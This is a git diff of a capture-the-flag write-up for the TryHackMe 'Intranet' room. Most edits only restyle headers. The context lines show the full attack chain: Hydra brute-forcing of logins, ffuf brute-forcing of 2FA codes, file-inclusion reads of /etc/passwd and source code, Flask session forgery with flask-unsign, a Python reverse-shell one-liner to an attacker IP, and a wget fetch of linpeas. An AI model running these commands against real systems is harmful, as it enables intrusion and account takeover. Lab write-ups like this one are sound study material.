@@ -16,7 +16,7 @@ Start the VM by pressing the green "Start Machine" button. Please allow the mach
 <p><em>Answer the questions below</em></p>
 
 <br>
-<h2>Virtual Environment</h2>
+<h2 align="center">Virtual Environment</h2>
 
 ```bash
 :~/Intranet# python3 -m venv rosana
@@ -27,7 +27,7 @@ Start the VM by pressing the green "Start Machine" button. Please allow the mach
 (rosana) :~/Intranet# 
 ```
 
-<h2>Nmap</h2>
+<h2 align="center">Nmap</h2>
 
 <p>
 
@@ -104,13 +104,13 @@ PORT     STATE SERVICE    VERSION
 |_Requested resource was /login
 ```
 
-<h2>/etc/hosts</h2>
+<h2 align="center">/etc/hosts</h2>
 
 ```bash
 xx.xxx.x.xxx intranet.thm
 ```
 
-<h2>Gobuster</h2>
+<h2 align="center">Gobuster</h2>
 <p>
 
 - <code>intranet.thm:8080/temporary</code> > <code>intranet.thm:8080/home</code> > <code>intranet.thm:8080/login</code></p>
@@ -141,7 +141,7 @@ Finished
 ===============================================================
 ```
 
-<h2>Web 8080</h2>
+<h1 align="center">Web application</h1>
 
 <img width="1062" height="552" alt="image" src="https://github.com/user-attachments/assets/aed4e827-9606-465d-80f1-e9cb1de5fb36" />
 
@@ -156,7 +156,7 @@ Finished
 <img width="1264" height="577" alt="image" src="https://github.com/user-attachments/assets/c2d2edd3-377e-472e-bb6a-3b32b42002dd" />
 
 <br>
-<h2>Login</h2>
+<h2 align="center">Login</h2>
 <p>
   
 - 200 OK, Invalid password for username= <code>anders</code>%40securesolacoders.no&password=password<br>
@@ -164,7 +164,7 @@ Finished
 - 200 OK, Invalid username for username= <code>magnus</code>%40securesolacoders.no&password=password<br>
 - 200 OK, Invalid password for username= <code>admin</code>%40securesolacoders.no&password=password</p>
 
-<h2>Keywords</h2>
+<h2 align="center">Keywords</h2>
 
 ```bash
 (rosana) :~/Intranet# cat reference
@@ -177,13 +177,13 @@ developer
 senior
 ```
 
-<h2>John the Ripper to create a wordlist</h2>
+<h2 align="center">John the Ripper . Wordlist</h2>
 
 ```bash
 (rosana) :~/Intranet# john -wordlist:reference -rules:jumbo -stdout > words
 ```
 
-<h2>Users</h2>
+<h2 align="center">Users</h2>
 
 ```bash
 (rosana) :~/Intranet# cat users
@@ -192,7 +192,7 @@ devops@40securesolacoders.no
 admin@securesolacoders.no
 ```
 
-<h2>Hydra</h2>
+<h2 align="center">Hydra</h2>
 
 <p>
 
@@ -208,7 +208,7 @@ admin@securesolacoders.no
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-28 xx:xx:xx
 ```
 
-<h3>intranet.thm:8080/login</h3>
+<h2 align="center">Login</h2>
 
 <img width="1268" height="490" alt="image" src="https://github.com/user-attachments/assets/910b075d-a69a-44ec-abe3-c27ba51323ab" />
 
@@ -254,10 +254,10 @@ Connection: close
 <p>You should be redirected automatically to the target URL: <a href="/sms">/sms</a>. If not, click the link.
 ```
 
-<h2>intranet.thm:8080/sms</h2>
+<h2 align="center">sms</h2>
 <p>
 
-- web application flag<br>
+- Web Application first flag<br>
 - <code>2FA</code> code has been sent to <code>+47 *****299</code></p>
 
 <h6>Request</h6>
@@ -312,7 +312,7 @@ Connection: close
 
 <br>
 
-<h2>Crunch to create a wordlist . 0000 to 9999</h2>
+<h2 align="center">Crunch . Wordlist . 0000 to 9999</h2>
 
 ```bash
 (rosana) :~/Intranet# crunch 4 4 -t %%%% -o support
@@ -336,7 +336,7 @@ crunch: 100% completed generating output
 9999
 ```
 
-<h2>Ffuf</h2>
+<h2 align="center">Ffuf</h2>
 
 ```bash
 (rosana) :~/Intranet# ffuf -u http://xx.xxx.x.xxx:8080/sms -c -w support -X POST -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=***************************.******.***************************' -fc 200
@@ -354,7 +354,7 @@ crunch: 100% completed generating output
 <br>
 <p>
 
-- second web application flag<br>
+- Web Application second flag<br>
 - source ip xx.xxx.xxx.xxx<br>
 - support@securesolacoders.no</p>
 
@@ -362,11 +362,11 @@ crunch: 100% completed generating output
 
 <br>
 <br>
-<p> 1.2. What is the second web application flag? Hint : <em>Research common techniques to bypass this security mechanism</em>.<br>
+<p>1.2. What is the second web application flag? Hint : <em>Research common techniques to bypass this security mechanism</em>.<br>
 <code>THM{********************************}</code></p>
 
 <br>
-<h2>intranet.thm:8080/internal</h2>
+<h2 align="center">internal</h2>
 <p>
 
 - Update news feed : <code>Update</code>
@@ -376,7 +376,7 @@ crunch: 100% completed generating output
 <img width="1262" height="611" alt="image" src="https://github.com/user-attachments/assets/a9c30cf2-fa31-4167-b31d-1da245c8c84c" />
 
 <br>
-<h2>intranet.thm:8080/external</h2>
+<h2 align="center">external</h2>
 <p>
 
 - external@securesolacoders.io</p>
@@ -384,7 +384,7 @@ crunch: 100% completed generating output
 <img width="1267" height="214" alt="image" src="https://github.com/user-attachments/assets/7ba68ae2-d50f-4f35-8114-daa11822eb14" />
 
 <br>
-<h2>Update</h2>
+<h2 align="center">Update</h2>
 <p>
 
 - news=latest</p>
@@ -392,7 +392,7 @@ crunch: 100% completed generating output
 <img width="1349" height="282" alt="image" src="https://github.com/user-attachments/assets/b383f823-62cf-4fc6-bb30-28db12243df2" />
 
 <br>
-<h2>/etc/passwd</h2>
+<h2 align="center">/etc/passwd</h2>
 <p>
 
 - <code>root</code><br>
@@ -402,14 +402,17 @@ crunch: 100% completed generating output
 <img width="1348" height="579" alt="image" src="https://github.com/user-attachments/assets/59f31230-3c14-4384-b402-fd05bf8ed574" />
 
 <br>
-<h2>/proc/self/cmdline</h2>
+<h2 align="center">/proc/self/cmdline</h2>
 <p>
 
 - /usr/bin/python3/home/devops/app.py</p>
 
 <img width="1371" height="341" alt="image" src="https://github.com/user-attachments/assets/ac8ba206-9233-4d2c-be58-6955ecb100b0" />
 
-<h2>/home/devops/app.py</h2>
+<h2 align="center">/home/devops/app.py</h2>
+<p>
+
+- Web Application third flag</p>
 
 <img width="1369" height="493" alt="image" src="https://github.com/user-attachments/assets/c81bb3a4-9486-4c0d-aad6-39a0dccf3353" />
 
@@ -417,6 +420,8 @@ crunch: 100% completed generating output
 <br>
 <p>1.3. What is the third web application flag?<br>
 <code>THM{******************************}</code></p>
+
+<br>
 <p>
 
 - key : secret_key_ + ######<br>
@@ -618,13 +623,13 @@ if __name__ == &#34;__main__&#34;:
 ```
 
 <br>
-<h2>Flask Installation</h2>
+<h2 align="center">Flask Installation</h2>
 
 ```bash
 (rosana) :~/Intranet# sudo pip3 install flask-unsign
 ```
 
-<h2>Wordlist . 100000 to 999999 . mylist.txt</h2>
+<h2 align="center">Wordlist . 100000 to 999999 . mylist.txt</h2>
 
 ```bash
 (rosana) :~/Intranet for i in $(seq 100000 999999); do echo "secret_key_$i"; done > mylist.txt
@@ -638,13 +643,13 @@ secret_key_999998
 secret_key_999999
 ```
 
-<h2>JWT from current session . sessioncookie.txt</h2>
+<h2 align="center">JWT from current session . sessioncookie.txt</h2>
 
 ```bash
 (rosana) :~/Intranet# echo 'eyJsb2dnZWRfaW4iOnRyd********************W5kZXJzIn0.aLDGKA.1smTdr1kBmdozdXsABbPohXWavc' > sessioncookie.txt
 ```
 
-<h2>Secret Key</h2>
+<h2 align="center">Secret Key</h2>
 
 ```bash
 (rosana) :~/Intranet# flask-unsign --unsign --cookie "$(cat sessioncookie.txt)" --wordlist mylist.txt
@@ -654,18 +659,19 @@ secret_key_999999
 'secret_key_xxxxxx'
 ```
 
-<h2>JWT to enable admin´s session</h2>
+<h2 align="center">JWT to enable admin´s session</h2>
 
 ```bash
 (rosana) :~/Intranet# flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret_key_xxxxxx"
 eyJsb2dnZWRfaW4iOn*************************Q.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
 ```
 
-<h2>admin</h2>
+<h2 align="center">admin</h2>
 <p>
 
 - substituted the session´s cookie<br>
 - refreshed</p>
+- Web Application fourth flag</p>
 
 <img width="1267" height="342" alt="image" src="https://github.com/user-attachments/assets/9ffe43dd-c7d7-4a78-a763-e8de0f6fc487" />
 
@@ -675,7 +681,7 @@ eyJsb2dnZWRfaW4iOn*************************Q.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
 <code>THM{********************************}</code></p>
 
 <br>
-<h2>Reverse Shell</h2>
+<h2 align="center">Reverse Shell</h2>
 
 ```bash
 /usr/bin/python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xxx.xxx",52222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
@@ -685,7 +691,7 @@ eyJsb2dnZWRfaW4iOn*************************Q.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
 %2Fusr%2Fbin%2Fpython3%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22xx%2Exxx%2Exxx%2Exxx%22%2C52222%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3Bos%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27
 ```
 
-<h2>Burp´s Repeater</h2>
+<h2 align="center">Burp´s Repeater</h2>
 
 ```bash
 POST /admin HTTP/1.1
@@ -739,7 +745,7 @@ THM{*****************************}
 <code>THM{*****************************}</code></p>
 
 <br>
-<h2>ps aux</h2>
+<h2 align="center">ps aux</h2>
 <p>
 
 - /usr/sbin/apache2 -k start</p>
@@ -834,6 +840,8 @@ THM{**********************}
 <code>THM{**********************}</code></p>
 
 <br>
+
+<h1 align="center">Root</h1>
 
 ```bash
 anders@...:/$ wget http://xx.xx.xx.xx:8000/linpeas.sh
